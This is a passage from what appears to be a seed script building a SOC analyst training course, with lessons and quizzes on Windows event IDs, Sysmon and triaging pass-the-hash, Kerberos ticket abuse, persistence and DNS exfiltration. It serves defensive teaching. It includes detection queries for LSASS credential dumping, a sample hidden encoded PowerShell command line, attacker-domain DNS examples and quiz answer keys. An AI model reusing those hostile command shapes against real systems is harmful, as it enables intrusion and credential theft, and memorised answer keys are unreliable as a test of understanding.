- **Explicit credentials** — credentials supplied at runtime via runas or RunAs API; logged as 4648
- **Audit log clearing** — manual clearing of the Security log; produces 1102, near-universal red flag
- **Service install** — registration of a new Windows service, logged as 7045 on System channel
- **Network share access** — SMB share open, logged as 5140; per-object access is 5145 (noisy)

## Further reading

- Microsoft Learn — Audit Logon (4624/4625): https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4624
- Microsoft Learn — Audit Kerberos Authentication Service: https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-kerberos-authentication-service
- Microsoft Learn — Event 1102 audit log cleared: https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-1102
- MITRE ATT&CK — T1110 Brute Force, T1558 Kerberos Tickets, T1070.001 Clear Windows Event Logs
- SANS — Windows Logging Cheat Sheet (Malware Archaeology)
""",
    )
    m3l2q = _add_lesson(
        session, mod3, order=4, title="Security event IDs — quiz",
        lesson_type=LessonType.QUIZ, duration_min=10,
        content_md="Six questions on LogonTypes, account/group cluster, Kerberos, and triage pivots.",
    )
    _add_q(session, m3l2q, order=1, kind=QuestionKind.SINGLE,
        stem_md="A 4624 event has `LogonType: \"3\"` and `source.ip: \"10.4.5.99\"`. The source IP is a workstation, not a server. What is the most likely activity?",
        options=[
            {"value": "console", "label": "A user logged in at the console"},
            {"value": "rdp", "label": "A user RDP'd in"},
            {"value": "network_smb", "label": "A network logon from the workstation, e.g. SMB share access or pass-the-hash"},
            {"value": "task", "label": "A scheduled task started"},
        ],
        correct="network_smb",
        explanation_md="LogonType 3 is network logon. SMB share access, IPC$ enumeration, and pass-the-hash all produce LogonType 3 events. Console = LogonType 2; RDP = LogonType 10; scheduled task = LogonType 4.",
        points=2,
    )
    _add_q(session, m3l2q, order=2, kind=QuestionKind.MULTI,
        stem_md="Which events are typical signals of attacker persistence via account creation?",
        options=[
            {"value": "4720", "label": "4720 (account created)"},
            {"value": "4732", "label": "4732 (member added to local group)"},
            {"value": "4634", "label": "4634 (account logged off)"},
            {"value": "4756", "label": "4756 (member added to universal group)"},
            {"value": "4624", "label": "4624 (account logged on)"},
        ],
        correct=["4720", "4732", "4756"],
        explanation_md="4720 then 4732/4756 is the canonical create-and-elevate pattern. 4634 is just logoff; 4624 is a logon and not specifically persistence by itself.",
        points=3,
    )
    _add_q(session, m3l2q, order=3, kind=QuestionKind.SHORTANSWER,
        stem_md="You see a 4769 with `TicketEncryptionType: \"0x17\"` and `TargetUserName: \"MSSQLSVC\"`. What's likely happening, and which ATT&CK technique applies?",
        options=None,
        correct=["Kerberoasting T1558.003", "Kerberoasting", "T1558.003 Kerberoasting", "T1558.003"],
        explanation_md="RC4-HMAC service tickets for a service account is the textbook signature of Kerberoasting (**T1558.003**). The attacker has requested a service ticket they can crack offline because RC4 keys are derived directly from the service account's NT hash.",
        points=2,
    )
    _add_q(session, m3l2q, order=4, kind=QuestionKind.SINGLE,
        stem_md="Which event is the *highest-priority* by itself, with essentially no false-positive case?",
        options=[
            {"value": "4624", "label": "4624"},
            {"value": "4625", "label": "4625"},
            {"value": "1102", "label": "1102"},
            {"value": "7045", "label": "7045"},
        ],
        correct="1102",
        explanation_md="**1102** is *audit log cleared.* There is no legitimate operational reason for someone to manually clear a production Security log; it's almost always evidence-destruction (T1070.001). 7045 is high-value but has many legitimate cases (driver installs).",
        points=2,
    )
    _add_q(session, m3l2q, order=5, kind=QuestionKind.SHORTANSWER,
        stem_md="You're triaging a 4625 burst from `10.42.18.91` against 12 usernames with `SubStatus: \"0xC000006A\"`. State your next two pivots.",
        options=None,
        correct=["check 4624 from same source", "query 4624 same source.ip", "see if any logon succeeded, check asset inventory", "look for successful 4624, check who owns the IP"],
        explanation_md="(1) Query `event.code : \"4624\" and source.ip : \"10.42.18.91\"` over the same window to see if any logon *succeeded*. (2) Cross-reference `10.42.18.91` against asset inventory / DHCP to identify the source host.",
        points=2,
    )
    _add_q(session, m3l2q, order=6, kind=QuestionKind.TRUEFALSE,
        stem_md="Event 4688 always includes the full process command line.",
        options=[{"value": "true", "label": "True"}, {"value": "false", "label": "False"}],
        correct="false",
        explanation_md="**False.** 4688 only includes the `CommandLine` field if the GPO setting *Include command line in process creation events* is enabled. Many enterprises don't enable it (risk of credentials in command lines being logged). This is exactly why **Sysmon Event 1** — which always includes CommandLine and adds parent process and hash — is the L1's preferred process-create source.",
        points=1,
    )

    # Lesson 3.3 — Sysmon
    m3l3 = _add_lesson(
        session, mod3, order=5,
        title="Sysmon — the L1 superpower",
        lesson_type=LessonType.READING, duration_min=24,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Explain what Sysmon is, how it differs from native Windows auditing, and why it's effectively mandatory in mature SOCs
> 2. List the high-value Sysmon event IDs (1, 3, 7, 8, 10, 11, 13, 22) and describe what each captures
> 3. Map common Sysmon fields (`Image`, `ParentImage`, `CommandLine`, `Hashes`, `OriginalFileName`) to ECS
> 4. Recognise the SwiftOnSecurity and Olaf Hartong baseline configurations as the de-facto starting points
> 5. Identify a typical Sysmon-driven detection (Office spawns shell, suspicious DNS query, code injection) from raw events

## What Sysmon is and why it matters

**Sysmon** (System Monitor) is a free Microsoft Sysinternals driver-and-service that augments Windows native auditing with vastly richer endpoint telemetry. Where native Windows logs tell you *"process X started"*, Sysmon tells you:

> *"process X (hash `abc123`, parent `winword.exe`, original filename `powershell.exe`, signature `Microsoft Corporation`) started with command line `-enc JABjAD0AbgBlA…`, run by user `alice`, with an integrity level of `High`"*

The richness gap is enormous, and most production detection logic in modern SOCs assumes Sysmon is present.

Sysmon is configured by an XML configuration file. The two community-standard baselines are:

- **SwiftOnSecurity / sysmon-config** — the original community baseline. Conservative, well-documented, focuses on attacker-relevant noise reduction
- **Olaf Hartong / sysmon-modular** — modular baseline organised per ATT&CK technique. Richer, more granular, requires more tuning

As an L1 you don't author Sysmon config — but you must understand that **the Sysmon channel is `Microsoft-Windows-Sysmon/Operational`** and that every Sysmon event arrives in ION at `winlog.channel: "Microsoft-Windows-Sysmon/Operational"` with `event.provider: "Microsoft-Windows-Sysmon"`.

A Sysmon document also has its own internal event IDs, ranging from 1 to 28+. **The ones an L1 must memorise: 1, 3, 7, 8, 10, 11, 13, 22.**

```mermaid
flowchart TD
    SysmonDriver[Sysmon driver] --> Channel[Microsoft-Windows-Sysmon/Operational]
    Channel --> Winlogbeat
    Winlogbeat --> ECS[ECS-mapped winlogbeat-*]
    subgraph EventsCaptured[Events captured]
        E1[ID 1 ProcessCreate]
        E3[ID 3 NetworkConnect]
        E7[ID 7 ImageLoaded]
        E8[ID 8 CreateRemoteThread]
        E10[ID 10 ProcessAccess]
        E11[ID 11 FileCreate]
        E13[ID 13 RegistryEvent]
        E22[ID 22 DnsQuery]
    end
    SysmonDriver --> EventsCaptured
```

## The high-value Sysmon event IDs

### Event ID 1 — Process Create

The single most-queried event in any mature SOC. Fields:

- `winlog.event_data.Image` → ECS `process.executable` (the new process)
- `winlog.event_data.CommandLine` → ECS `process.command_line`
- `winlog.event_data.ParentImage` → ECS `process.parent.executable`
- `winlog.event_data.ParentCommandLine` → ECS `process.parent.command_line`
- `winlog.event_data.Hashes` → contains MD5/SHA256/IMPHASH; ECS `process.hash.sha256` etc.
- `winlog.event_data.OriginalFileName` → the PE's original filename from its version resource (catches **renamed binaries**)
- `winlog.event_data.User` → ECS `user.name`
- `winlog.event_data.IntegrityLevel` → process integrity (Low / Medium / High / System)

**ATT&CK:** T1059 Command and Scripting Interpreter, T1218 Signed Binary Proxy Execution, T1036 Masquerading.

### Event ID 3 — Network Connection

A process initiated a network connection. Fields: `Image`, `SourceIp`, `SourcePort`, `DestinationIp`, `DestinationPort`, `DestinationHostname`, `Protocol`. **ATT&CK:** T1071, T1041.

### Event ID 7 — Image Loaded

A DLL was loaded by a process. Fields: `Image` (loader), `ImageLoaded` (the DLL), `Signed`, `Signature`, `SignatureStatus`. Heavily filtered by config because Windows loads thousands of DLLs constantly. **ATT&CK:** T1574, T1055.

### Event ID 8 — CreateRemoteThread

A process created a thread in another process — the textbook code-injection primitive. Fields: `SourceImage`, `TargetImage`, `StartAddress`. **ATT&CK:** T1055.003.

### Event ID 10 — ProcessAccess

A process opened a handle to another process. **The classic Mimikatz signature** is `SourceImage` of any process opening `lsass.exe` with `GrantedAccess` of `0x1410` or `0x1010` (PROCESS_VM_READ + PROCESS_QUERY_INFORMATION). **ATT&CK:** T1003.001 (LSASS Memory).

### Event ID 11 — FileCreate

A file was created or overwritten. Fields: `Image`, `TargetFilename`, `CreationUtcTime`. The classic ransomware tell is mass `TargetFilename` writes ending in unusual extensions. **ATT&CK:** T1486.

### Event ID 13 — RegistryEvent (Value Set)

A registry value was written. Fields: `EventType`, `TargetObject` (the registry path), `Details`. **Persistence-detection gold** — Run keys, Image File Execution Options, services, scheduled tasks. **ATT&CK:** T1547.001.

### Event ID 22 — DnsQuery

A process performed a DNS query. Fields: `Image`, `QueryName`, `QueryStatus`, `QueryResults`. The textbook DNS-exfiltration signature is long, high-entropy `QueryName` values at high frequency. **ATT&CK:** T1071.004, T1048.003.

## A worked Sysmon triage

**Scenario.** ION fires the alert *"Office product spawned a shell"* against `WS-FINANCE-04`:

```kql
winlog.channel : "Microsoft-Windows-Sysmon/Operational"
and event.code : "1"
and process.parent.executable : ("*\\\\winword.exe" or "*\\\\excel.exe" or "*\\\\outlook.exe")
and process.executable : ("*\\\\powershell.exe" or "*\\\\cmd.exe" or "*\\\\wscript.exe")
```

The hit shows:

- `process.parent.executable: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"`
- `process.executable: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"`
- `process.command_line: "powershell.exe -nop -w hidden -enc JABjAD0AbgBlAHcALQBvAGIAagBlAGMAdAA…"`
- `winlog.event_data.OriginalFileName: "PowerShell.EXE"`
- `user.name: "alice"`
- `winlog.event_data.IntegrityLevel: "Medium"`

**Interpretation.** Word is the parent. PowerShell is the child. `-nop -w hidden -enc` is the standard *"hide and run base64"* pattern attackers use. The base64 blob is the encoded command. This is almost certainly a malicious macro execution (T1059.001 + T1566.001).

```mermaid
flowchart LR
    Email[Phishing email] --> Word[winword.exe]
    Word -->|Macro fires| PS[powershell.exe -enc ...]
    PS -->|Sysmon 1| Detect1[Office spawns shell]
    PS -->|Sysmon 22| Detect2[DNS query to C2]
    PS -->|Sysmon 3| Detect3[Network connect to C2]
    PS -->|Sysmon 11| Detect4[Drops payload to disk]
    PS -->|Sysmon 13| Detect5[Persistence in Run key]
```

**Pivot 1 — what did PowerShell do?** Find subsequent Sysmon Events 3, 11, or 1 from PowerShell.

**Pivot 2 — DNS queries.** Look at Sysmon 22 from the PowerShell process.

**Pivot 3 — was the macro a delivered email?** Pivot to Outlook attachment write events and from there to email logs.

**Disposition.** Almost always escalate. Containment runbook: isolate host, kill PowerShell, capture memory if possible, hand to L2/IR.

## KQL snippets

```kql
event.code : "10"
and process.target.executable : "*\\\\lsass.exe"
and not process.executable : ("*\\\\MsMpEng.exe" or "*\\\\System32\\\\svchost.exe")
```
- Sysmon 10 (ProcessAccess) targeting LSASS — the credential-dumping signature
- Excludes Defender (`MsMpEng.exe`) and svchost which legitimately query LSASS

```kql
event.code : "13"
and winlog.event_data.TargetObject : ("*\\\\CurrentVersion\\\\Run\\\\*" or "*\\\\CurrentVersion\\\\RunOnce\\\\*")
```
- Sysmon 13 RegistryEvent on the classic Run keys — a primary persistence detection

## Glossary

- **Sysmon** — Sysinternals system-monitor driver/service emitting enriched endpoint telemetry beyond native Windows auditing
- **Sysmon channel** — `Microsoft-Windows-Sysmon/Operational`
- **Image** — Sysmon's term for the executable path of a process; ECS `process.executable`
- **OriginalFileName** — PE version-resource original filename, used to detect renamed binaries
- **Hashes** — Sysmon-computed MD5/SHA256/IMPHASH on process create and image load
- **IntegrityLevel** — Windows process integrity (Low / Medium / High / System)
- **CreateRemoteThread** — Sysmon Event 8; cross-process thread creation, code-injection primitive
- **ProcessAccess** — Sysmon Event 10; opening a handle to another process, used by credential dumpers
- **GrantedAccess** — bitmask on Sysmon 10 indicating what access rights were requested
- **SwiftOnSecurity baseline** — community-standard Sysmon config, the conservative starting point
- **sysmon-modular** — Olaf Hartong's modular Sysmon config set, organised by ATT&CK technique
- **DnsQuery** — Sysmon Event 22; per-process DNS resolution capture, key for DNS-exfil detection

## Further reading

- Microsoft Sysinternals — Sysmon: https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
- SwiftOnSecurity / sysmon-config: https://github.com/SwiftOnSecurity/sysmon-config
- Olaf Hartong / sysmon-modular: https://github.com/olafhartong/sysmon-modular
- MITRE ATT&CK — T1003.001 OS Credential Dumping: LSASS Memory
- MITRE ATT&CK — T1071.004 Application Layer Protocol: DNS
""",
    )
    m3l3q = _add_lesson(
        session, mod3, order=6, title="Sysmon recognition — quiz",
        lesson_type=LessonType.QUIZ, duration_min=8,
        content_md="Six questions on Sysmon event IDs, fields, channel, and triage interpretation.",
    )
    _add_q(session, m3l3q, order=1, kind=QuestionKind.SINGLE,
        stem_md="Which Sysmon event captures a process opening a handle to another process — the foundational Mimikatz-against-LSASS signature?",
        options=[
            {"value": "id1", "label": "Event ID 1"},
            {"value": "id7", "label": "Event ID 7"},
            {"value": "id10", "label": "Event ID 10"},
            {"value": "id13", "label": "Event ID 13"},
        ],
        correct="id10",
        explanation_md="**Event ID 10** is ProcessAccess, capturing handle-opens between processes. The Mimikatz signature is `SourceImage` opening `TargetImage: lsass.exe` with high `GrantedAccess` (often `0x1410` or `0x1010`).",
        points=2,
    )
    _add_q(session, m3l3q, order=2, kind=QuestionKind.MULTI,
        stem_md="Which Sysmon fields would you use to detect a *renamed* `powershell.exe`?",
        options=[
            {"value": "orig", "label": "winlog.event_data.OriginalFileName"},
            {"value": "image", "label": "winlog.event_data.Image"},
            {"value": "hashes", "label": "winlog.event_data.Hashes"},
            {"value": "cmdline", "label": "winlog.event_data.CommandLine"},
        ],
        correct=["orig", "hashes"],
        explanation_md="`OriginalFileName` is the PE version-resource original filename — `powershell.exe` even if the file on disk is `update.exe`. `Hashes` lets you match against known PowerShell SHA256s. `Image` is just the path to the renamed file (useless on its own); `CommandLine` is contextual but not definitive.",
        points=3,
    )
    _add_q(session, m3l3q, order=3, kind=QuestionKind.SHORTANSWER,
        stem_md="A Sysmon Event 1 fires with `ParentImage` of `outlook.exe`, `Image` of `wscript.exe`, and `CommandLine` of `wscript.exe C:\\Users\\bob\\AppData\\Local\\Temp\\invoice.vbs`. What is the most likely scenario and which ATT&CK technique applies?",
        options=None,
        correct=["T1566.001 spearphishing T1059.005 visual basic", "spearphishing attachment + visual basic", "T1566.001 + T1059.005", "phishing attachment running vbs"],
        explanation_md="The user opened a `.vbs` attachment from Outlook. Outlook spawned wscript to execute the script. This is **T1566.001 Spearphishing Attachment + T1059.005 Visual Basic**.",
        points=2,
    )
    _add_q(session, m3l3q, order=4, kind=QuestionKind.SINGLE,
        stem_md="What is the `winlog.channel` value for Sysmon events?",
        options=[
            {"value": "sysmon_only", "label": "Sysmon"},
            {"value": "provider_only", "label": "Microsoft-Windows-Sysmon"},
            {"value": "channel_full", "label": "Microsoft-Windows-Sysmon/Operational"},
            {"value": "security", "label": "Security"},
        ],
        correct="channel_full",
        explanation_md="The full channel name is `Microsoft-Windows-Sysmon/Operational`. The provider is `Microsoft-Windows-Sysmon` but the channel includes the `/Operational` suffix.",
        points=2,
    )
    _add_q(session, m3l3q, order=5, kind=QuestionKind.TRUEFALSE,
        stem_md="Sysmon Event ID 1 always includes the parent process command line.",
        options=[{"value": "true", "label": "True"}, {"value": "false", "label": "False"}],
        correct="true",
        explanation_md="**True.** Sysmon Event ID 1 includes both `CommandLine` and `ParentCommandLine`. This is one of the largest advantages over native 4688, which often lacks `CommandLine` entirely (and never has `ParentCommandLine`).",
        points=1,
    )
    _add_q(session, m3l3q, order=6, kind=QuestionKind.SHORTANSWER,
        stem_md="You see a Sysmon Event 22 with `QueryName: \"5a3b2c1d.exfil.attacker.com\"` from `powershell.exe` on a finance workstation. State your next two queries.",
        options=None,
        correct=["aggregate by query name and count, find parent of powershell", "stats count by dns name, sysmon 1 to find parent", "aggregate volume, then find parent process"],
        explanation_md="(1) Aggregate Sysmon 22 by `dns.question.name` for the same host and process to estimate the DNS-tunnel volume. (2) Pivot to Sysmon Event 1 for the same host to identify the parent of `powershell.exe` and reconstruct how PowerShell was launched.",
        points=2,
    )

    # Lesson 3.4 — Attack patterns
    m3l4 = _add_lesson(
        session, mod3, order=7,
        title="Triaging common attack patterns from raw events",
        lesson_type=LessonType.READING, duration_min=24,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Distinguish interactive, network, and remote-interactive logons by LogonType and reason about expected vs anomalous patterns
> 2. Recognise pass-the-hash signatures from a 4624/4625 LogonType 3 + NTLM authentication package
> 3. Identify the rough indicators of golden ticket and silver ticket abuse in 4624 / 4769 events
> 4. Triage suspicious service installs (7045) using `ImagePath` heuristics
> 5. Spot account-creation-then-group-add patterns and Office-spawns-shell parent-child anomalies
> 6. Recognise DNS exfiltration via Sysmon Event 22

## Logon-context triage and pass-the-hash

The single most common L1 question is: *is this logon legitimate?* The answer almost always begins with the LogonType. A legitimate user at their workstation produces LogonType 2 (interactive) or 7 (unlock). A user RDP-ing in produces LogonType 10. A scheduled task produces 4. A service starting produces 5. **Anything else needs explanation.**

**LogonType 3 (network) is where attackers live.** SMB, file shares, IPC$, WMI, PsExec, WinRM — all produce 4624 with LogonType 3. Most LogonType 3 events are completely legitimate (Group Policy refresh, browse to a share). The triage signal is *which user, from where, to where*. A workstation-to-workstation LogonType 3 with admin credentials is suspicious — workstations don't usually authenticate to each other. A service-account LogonType 3 from a client subnet to a server is normal.

### Pass-the-Hash (T1550.002)

PtH is the attack where an attacker has captured an NTLM hash and uses it to authenticate without knowing the cleartext password. The signatures:

- 4624 with `LogonType: "3"` and `AuthenticationPackageName: "NTLM"` (rather than Kerberos)
- `LogonProcessName: "NtLmSsp"`
- Often paired with `KeyLength: "0"` (no Kerberos session key)
- `TargetUserName` is a privileged account; `IpAddress` is a workstation, not a server

In modern domains where Kerberos is the default, **NTLM logons to servers from workstation IPs are inherently suspicious** — especially for admin accounts.

```kql
event.code : "4624"
and winlog.event_data.LogonType : "3"
and winlog.event_data.AuthenticationPackageName : "NTLM"
and winlog.event_data.TargetUserName : ("Administrator" or "*-adm" or "svc-*")
```

A clean enterprise can drop NTLM almost entirely with Kerberos-only policies, which makes any remaining NTLM logon stand out.

```mermaid
flowchart TD
    Logon[4624 received] --> LType{LogonType}
    LType -->|2 Interactive| Console[Expected at console]
    LType -->|3 Network| Net{NTLM or Kerberos?}
    LType -->|10 RDP| RDP[Check source IP and user]
    Net -->|NTLM| NTLM{Privileged user?}
    Net -->|Kerberos| Krb[Normal SMB / share access]
    NTLM -->|Yes admin| PtH[Pass-the-Hash candidate]
    NTLM -->|No| Investigate[Investigate source]
    PtH --> Escalate[Escalate to L2]
```

**Worked example.** ION shows a 4624 on `FILESRV-01`. Fields: `LogonType: 3`, `AuthenticationPackageName: NTLM`, `TargetUserName: Administrator`, `IpAddress: 10.50.4.119`, `WorkstationName: ATTACKER-WIN`. The source IP belongs to a VLAN with helpdesk laptops; the `WorkstationName` is not a known asset name. **This is a textbook PtH attempt** — workstation-named source authenticating to a file server as Administrator over NTLM. Escalate, contain the file server, hunt the source workstation, and check 4768/4769 absence (PtH bypasses Kerberos by definition).

## Golden tickets, silver tickets, and service-install persistence

**Golden ticket (T1558.001)** is forging a TGT using the krbtgt account's hash. A real TGT comes from a 4768 on a DC. A golden ticket *did not* — it was forged offline. The signature: a 4624 on a member server using a Kerberos-signed token whose corresponding 4768 on the DC does not exist.

**Silver ticket (T1558.002)** is forging a service ticket (TGS) using a service account's hash. Even more subtle — a silver ticket means the *DC is never contacted at all*. The 4624 on the targeted service host appears, but no 4769 fires on the DC.

**L1 generally cannot conclusively detect golden or silver tickets** — these are L2 hunting territory. But L1 should **flag for escalation any high-privilege Kerberos logon that lacks corresponding 4768/4769 on the DC**, because that's the conceptual signal.

### Service install persistence (T1543.003)

When attackers establish persistence as SYSTEM, installing a service is one of the cleanest mechanisms. Event ID 7045 on the System channel fires. The triage heuristics on `ImagePath`:

- Path in `%TEMP%`, `%APPDATA%`, `\\Users\\Public\\` → **suspicious**
- Path that's a base64-encoded PowerShell command (`powershell -enc …`) → almost certainly malicious
- `ImagePath` pointing to `cmd.exe /c …` → masqueraded service
- Random-string service names (`Hyguafkj`, `WindowsHelper42`) → tooling tell (Cobalt Strike, Metasploit `psexec_psh`)

```kql
event.code : "7045"
and (winlog.event_data.ImagePath : ("*\\\\Temp\\\\*" or "*\\\\AppData\\\\*" or "*powershell*-enc*" or "*\\\\Users\\\\Public\\\\*"))
```

### Account creation followed by group add

The 4720 → 4732/4756 cluster discussed in Lesson 2 is the persistence pattern that L1 sees most often:

```mermaid
flowchart LR
    A[4720 account created] --> B{Group add within 10m?}
    B -->|4732 BUILTIN Admins| Persist1[Local admin persistence]
    B -->|4756 Universal group| Persist2[Domain group persistence]
    B -->|4728 Global group e.g. Domain Admins| Persist3[CRITICAL escalate now]
    B -->|None| Watch[Continue monitoring]
    Persist1 --> Esc[Escalate]
    Persist2 --> Esc
    Persist3 --> Esc
```

Any 4720 with the same `TargetUserName` followed within minutes by a 4732 against `BUILTIN\\Administrators` (SID `S-1-5-32-544`) or 4756/4728 against `Domain Admins` (`-512`) is an **immediate-escalate**.

## Parent-child anomalies and DNS exfil

**Parent-child anomalies** are the cleanest Sysmon-driven signal. A baseline of *what should never spawn what* gives high-fidelity detection:

| Parent | Suspicious child |
| --- | --- |
| `winword.exe`, `excel.exe`, `outlook.exe`, `powerpnt.exe` | `cmd.exe`, `powershell.exe`, `wscript.exe`, `mshta.exe`, `regsvr32.exe` |
| `mshta.exe`, `regsvr32.exe`, `wmic.exe` | `cmd.exe`, `powershell.exe` |
| `services.exe` | anything in user-writable paths |
| `svchost.exe` | `cmd.exe` or `powershell.exe` (rare; investigate) |
| `lsass.exe` | any child (lsass should never spawn anything) |
| `w3wp.exe` (IIS), `httpd.exe` | `cmd.exe`, `powershell.exe` (**webshell tell**) |

The Office-spawns-shell example covered in Lesson 3 is the canonical. The IIS-spawns-shell row is the canonical webshell signature (T1505.003).

### DNS exfiltration via Sysmon 22

When attackers can't C2 over HTTP/HTTPS (egress-filtered networks), DNS is the fallback because almost all networks resolve outbound DNS. Tools like `dnscat2` and `iodine` encode payloads as long subdomains under an attacker-controlled domain. Signatures:

- `dns.question.name` length consistently >50 chars
- Subdomains base64- or hex-shaped (high entropy, mixed case)
- Hundreds of queries per minute from a single process
- Always to the same parent domain, varying subdomain
- Process is unexpected for DNS (e.g. `powershell.exe` rather than `chrome.exe`)

A workstation generating 200+ unique DNS names in a short window with a high cardinality from a single process is the smoke. Confirm by inspecting query lengths and entropy.

## Glossary

- **Pass-the-Hash (PtH)** — T1550.002, authenticating with an NTLM hash without the cleartext password
- **Golden ticket** — T1558.001, forged TGT signed with the krbtgt hash
- **Silver ticket** — T1558.002, forged TGS signed with the service account hash
- **AuthenticationPackageName** — 4624 field indicating Kerberos / NTLM / Negotiate; NTLM for admin accounts is the PtH tell
- **WorkstationName** — 4624 field carrying the NetBIOS name claimed by the source; attacker-controlled and often anomalous
- **ImagePath** — 7045 field giving the binary path of an installed service; primary triage heuristic for malicious service installs
- **Webshell** — server-side script enabling remote command execution via web requests; surfaces as `w3wp.exe` spawning shells in Sysmon 1
- **DNS exfiltration** — encoding payload data in DNS queries; surfaces as long, high-entropy subdomains in Sysmon Event 22
- **Parent-child anomaly** — process lineage that violates expected baselines (e.g. winword spawning powershell)
- **LAPS** — Local Administrator Password Solution; rotates local admin passwords per host to break PtH lateral movement
- **krbtgt** — special domain account whose hash signs TGTs; whoever steals it can forge golden tickets indefinitely
- **Privileged group escalation** — adding an attacker-controlled account to BUILTIN\\Administrators (SID -544) or Domain Admins (-512); 4732/4756/4728

## Further reading

- MITRE ATT&CK — T1550.002 Pass the Hash: https://attack.mitre.org/techniques/T1550/002/
- MITRE ATT&CK — T1558.001 Golden Ticket: https://attack.mitre.org/techniques/T1558/001/
- MITRE ATT&CK — T1558.002 Silver Ticket: https://attack.mitre.org/techniques/T1558/002/
- MITRE ATT&CK — T1543.003 Windows Service: https://attack.mitre.org/techniques/T1543/003/
- MITRE ATT&CK — T1505.003 Web Shell: https://attack.mitre.org/techniques/T1505/003/
- Microsoft Learn — Audit Process Creation (4688)
""",
    )
    m3l4q = _add_lesson(
        session, mod3, order=8, title="Attack patterns — quiz",
        lesson_type=LessonType.QUIZ, duration_min=10,
        content_md="Six questions on PtH, persistence, parent-child anomalies, and DNS exfil.",
    )
    _add_q(session, m3l4q, order=1, kind=QuestionKind.SHORTANSWER,
        stem_md="A 4624 fires on `FILESRV-02` with `LogonType: \"3\"`, `AuthenticationPackageName: \"NTLM\"`, `TargetUserName: \"Administrator\"`, `IpAddress: \"10.50.4.119\"` (a workstation subnet), `WorkstationName: \"WS-CONTRACTOR-07\"`. What attack are you looking at?",
        options=None,
        correct=["pass-the-hash T1550.002", "pass the hash", "PtH T1550.002", "T1550.002", "Pass-the-Hash"],
        explanation_md="**Pass-the-Hash (T1550.002).** NTLM authentication for the local Administrator account from a workstation source to a file server, in a domain that should default to Kerberos, is the textbook signature. Containment: isolate `FILESRV-02` and `WS-CONTRACTOR-07`, escalate to L2/IR.",
        points=2,
    )
    _add_q(session, m3l4q, order=2, kind=QuestionKind.SINGLE,
        stem_md="Which event ID directly indicates audit log tampering and should always be escalated?",
        options=[
            {"value": "4624", "label": "4624"},
            {"value": "4688", "label": "4688"},
            {"value": "1102", "label": "1102"},
            {"value": "7045", "label": "7045"},
        ],
        correct="1102",
        explanation_md="**1102** fires when the Security audit log is cleared. There is no legitimate operational reason for this on a production system; it's near-universally evidence destruction (T1070.001).",
        points=2,
    )
    _add_q(session, m3l4q, order=3, kind=QuestionKind.MULTI,
        stem_md="Which heuristics on a 7045 ImagePath are suspicious?",
        options=[
            {"value": "temp", "label": "Path under %TEMP%"},
            {"value": "progfiles", "label": "Path under C:\\Program Files\\"},
            {"value": "ps_enc", "label": "ImagePath containing powershell -enc"},
            {"value": "cmd_c", "label": "ImagePath containing cmd.exe /c"},
            {"value": "drivers_sys", "label": "Path ending in .sys under C:\\Windows\\System32\\drivers\\"},
        ],
        correct=["temp", "ps_enc", "cmd_c"],
        explanation_md="Temp paths, encoded PowerShell, and cmd-as-service are all attacker-tooling tells. Program Files and System32 driver paths are normal install locations for legitimate vendor software.",
        points=3,
    )
    _add_q(session, m3l4q, order=4, kind=QuestionKind.SHORTANSWER,
        stem_md="You see a Sysmon Event 22 burst from `WS-FINANCE-04`: 480 DNS queries in 2 minutes from `powershell.exe`, all to `*.exfil.attacker.com`, with average subdomain length of 60 characters. What is happening?",
        options=None,
        correct=["DNS exfiltration T1071.004", "DNS C2 / exfil", "DNS tunnelling T1071.004", "DNS exfiltration"],
        explanation_md="**DNS exfiltration via PowerShell to a C2 domain (T1071.004 + T1048.003).** The long subdomains are encoded payload chunks; the constant parent domain is the C2; the high query rate is the data-transfer pattern. Isolate the host immediately.",
        points=2,
    )
    _add_q(session, m3l4q, order=5, kind=QuestionKind.TRUEFALSE,
        stem_md="A legitimate Kerberos logon to a member server should always have a corresponding 4768/4769 on a domain controller around the same time.",
        options=[{"value": "true", "label": "True"}, {"value": "false", "label": "False"}],
        correct="true",
        explanation_md="**True (mostly).** A legitimate Kerberos AS-REQ produces 4768 on the DC; a TGS-REQ produces 4769. A 4624 with Kerberos auth whose ticket lacks corresponding DC-side events is the conceptual signal of golden/silver ticket forgery. Caveat: ticket caching can produce a 4624 without a fresh 4768/4769 within a tight window, so absence over a short window is suspicious-not-conclusive.",
        points=2,
    )
    _add_q(session, m3l4q, order=6, kind=QuestionKind.SHORTANSWER,
        stem_md="You see a 4720 on `DC01` for new user `mssql_helper`, followed 4 minutes later by a 4732 adding the same user to `BUILTIN\\Administrators`. State your next two actions.",
        options=None,
        correct=["identify subjectusername actor, disable account, scope actor logons", "identify the actor, disable mssql_helper, escalate", "find SubjectUserName, pull actor 4624 logons, disable new account"],
        explanation_md="(1) Identify the `SubjectUserName` (the account that performed the create+add) — that's the actor. (2) Disable the new `mssql_helper` account immediately, remove it from Administrators, and pull all 4624 logons by the actor account in the prior 24h to scope how the attacker got admin in the first place.",
        points=2,
    )

    # ── Module 4 — Network Telemetry (v0.11.7) ───────────────────────────
    # Authored at BTL1/SANS depth from research-agent dossier. Builds on
    # Module 3 (endpoint logs) by covering what happens *between* hosts:
    # PCAP/flow/Zeek/IDS, conn_state codes, ECS mapping, beaconing and DNS
    # tunneling, scans/sweeps, exfiltration patterns, ATT&CK mapping for
    # network-side observables.
    mod4 = _add_module(
        session, course, order=4,
        title="Network Telemetry",
        description_md=(
            "What endpoint logs cannot tell you: who talked to whom, when, "
            "how often, and how much. PCAP, flow records, Zeek metadata, "
            "and IDS alerts; conn_state triage; beaconing and DNS tunneling "
            "fingerprints; scans, sweeps, lateral movement, and bulk "
            "exfiltration to cloud-storage destinations; mapping all of "
            "the above to MITRE ATT&CK."
        ),
        estimated_minutes=200,
    )

    # Lesson 4.1 — data sources
    m4l1 = _add_lesson(
        session, mod4, order=1,
        title="Network data sources — PCAP, flow, Zeek, IDS",
        lesson_type=LessonType.READING, duration_min=22,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Compare PCAP, flow records (NetFlow/IPFIX/sFlow), protocol metadata (Zeek), and IDS alerts (Suricata/Snort) across cost, retention, fidelity, and privacy
